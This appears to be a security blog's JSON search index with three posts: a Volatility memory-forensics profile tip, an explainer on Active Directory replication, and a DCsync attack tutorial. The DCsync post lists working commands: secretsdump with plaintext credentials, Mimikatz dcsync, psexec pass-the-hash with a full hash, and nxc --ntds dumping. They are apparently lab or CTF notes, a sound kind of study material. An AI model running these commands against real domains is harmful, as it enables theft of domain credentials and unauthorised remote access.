[
  
  {
    "title": "Volatiltiy - imageinfo Plugin",
    "url": "/posts/VolatilityImageInfo/",
    "categories": "Blue Team, Volatility",
    "tags": "Volatiltiy2, Volatiltiy3, imageinfo, DFIR",
    "date": "2025-10-02 17:12:00 -0400",
    "content": "Instead of struggling for hours with the plugin imageinfoto identify the image profile, especially when dealing with images exceeding 50GB that take 2+ hours, we can utilize Volatility3 plugins and leverage their output for Volatility2, yeah !!  Essentially, Windows stores comprehensive information in registry hives. In this article, we’ll focus on the Software hive, particularly on the current build number and other relevant information.  Volatility3 can extract Software hive information using only the “windows.registry” Plugin, bypassing the need for the imageinfo plugin. Thus, we can take advantage of this plugin to read the registry hive.  This method isn’t common, so if I see you using it, I’m pretty sure you’ve read this article! xD  The following example involves an image from a CTF, but this method can be applied to any memory image you desire! I’ve been using this approach for two years now, and it has never let me down.     we need to  read all the information stored in the current version of the Software hive, specifically related to the system’s general information, by using the following command in volatility 3:   vol3 -f memdump.mem windows.registry.printkey.PrintKey — key “Microsoft\\Windows NT\\CurrentVersion”        After running the command, what we need to focus on are:            ProductName: Windows 10 Pro                CurrentBuildNumber: 19043                            now we need to use volatiltiy 2 to get the excat or closest profile for the memory by using this command:   vol.py -info | grep Win10     Our Profile number on volatiltiy 3 is 19043 , from this step we can chose the same number if we can’t find the same number we can choose the closest one to the current number, in our case 19041       Note(1): Sometimes you may obtain the exact number depending on the Windows version, while other times you might receive a number higher than yours. It’s generally better to select a number that is equal to or higher than yours.       Note(2): For Windows service pack numbers, you can obtain them using the same method. The more accurate the number, the faster and error-free the output you’ll receive.   "
  },
  
  {
    "title": "DCsync Attack",
    "url": "/posts/DCsyncAttack/",
    "categories": "Active Directory - CRTP, DCsync, DCsync Attack",
    "tags": "Replication, secretdump, ntds, ChangeAll",
    "date": "2025-09-29 11:00:00 -0400",
    "content": "DCsync  abuses Active Directory replication: an attacker impersonates a domain controller and requests replication from a real DC to obtain credential material (password hashes, Kerberos keys, etc.). This lets the attacker harvest account credentials without directly compromising the domain controller’s NTDS.dit file.  How it works (short):       AD replication allows DCs to exchange directory changes.   If an account has the appropriate replication privileges, an actor can request those changes and receive sensitive secrets (NT hashes, AES keys) for domain accounts.   This is not possible for arbitrary domain users — specific permissions are required.   Required permissions / privileges  (typically granted to high-privilege groups such as Domain Admins / Enterprise Admins / Domain Controllers, or explicitly delegated):     DS-Replication-Get-Changes   DS-Replication-Get-Changes-All   DS-Replication-Get-Changes-In-Filtered-Set     Typical workflow / examples     Attacker impersonates a domain controller and requests replication from a real DC.   Use tools to request/collect secrets from the target DC.   Example tools / commands (formatted):  # Using Impacket's secretsdump (example placeholder) # format may vary; adapt to your toolset/environment secretsdump.py svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175  # Mimikatz (run on a compromised machine with appropriate privileges) # in mimikatz interactive shell: lsadump::dcsync /user:DOMAIN\\Geno  # Use harvested hashes with psexec (Impacket) to authenticate over SMB psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' \\   -dc-ip 10.10.10.175 administrator@10.10.10.175  # Another example tool invocation (nxc.exe example from your notes) nxc.exe smb geno.gove.local -u mikasa -p 'P@ssw0rd' --ntds   "
  },
  
  {
    "title": "What is Replication",
    "url": "/posts/Replication/",
    "categories": "Active Directory - CRTP, DCsync, Replication",
    "tags": "Replication, KCC, AD",
    "date": "2025-09-28 11:00:00 -0400",
    "content": "DCsync  we need to understand Replication in order to perform DCsync Attack.  What is Replication in Active Directory?  Replication is the process used between Domain Controllers (DCs) in an Active Directory environment to ensure they all have the same up-to-date database.  Every Domain Controller stores a copy of the Active Directory database.     If one DC fails, others can still provide authentication and authorization services.   This is why large organizations need multiple DCs that constantly replicate data.   Example:  If an administrator adds a new user on DC1, the same information must be replicated to DC2 and DC3.  That way, if DC1 goes down, the user can still log in through DC2 because their credentials exist there as well.  so  any single change has been done on one of the DC will be replicated on the other DCs  The Active Directory database is stored in the file:  C:\\Windows\\ntds.dit   Any change in AD is written to this file, and then replicated across other DCs.    How Replication Works     When a change happens on DC1, a notification is generated by the KCC (Knowledge Consistency Checker).        Other DCs see this notification and pull the update from DC1.             Important: Updates are pulled by DCs, not pushed automatically.            Replication can be scheduled (e.g., twice a day, before and after working hours) to reduce bandwidth impact.  By default, the KCC refreshes every 15 minutes, or it can be triggered manually with:  repadmin /kcc     Active Directory Partitions  The ntds.dit file contains four partitions:     Domain Partition – Stores objects, containers, and domain information.   Configuration Partition – Stores sites, services, and AD configuration.            Same site: replication happens every 7–15 seconds.       Different sites: every 180 minutes.           Schema Partition – Defines object classes and attributes.   Application Partition – Used for DNS replication:            To all DNS servers in the forest.       To all DNS servers in the domain.             Types of Replication     Intra-site – Between DCs within the same site.   Inter-site – Between DCs across different sites.     Single Master vs Multi-Master          Single Master:      If there’s only one DC in the domain, no replication occurs (no second DC to sync with).           Multi-Master:      If multiple DCs exist and all are writable, replication occurs across all of them.        Tricks and Notes     If a user is moved to an OU and that OU is deleted on another DC, the user object ends up in the LostAndFound container.   Replication conflicts and versioning:            Every object has:                    Version Number – the edit version.           Timestamp – time of the change.           DC GUID – the identifier of the DC that made the change.                       The newest update (version + timestamp) wins and replicates to other DCs.                Indirect Replication:      Example with DC1, DC2, DC3:             DC1 and DC3 are not directly connected.       DC2 is connected to both.       Updates flow from DC1 → DC2 → DC3.           "
  }
  
]

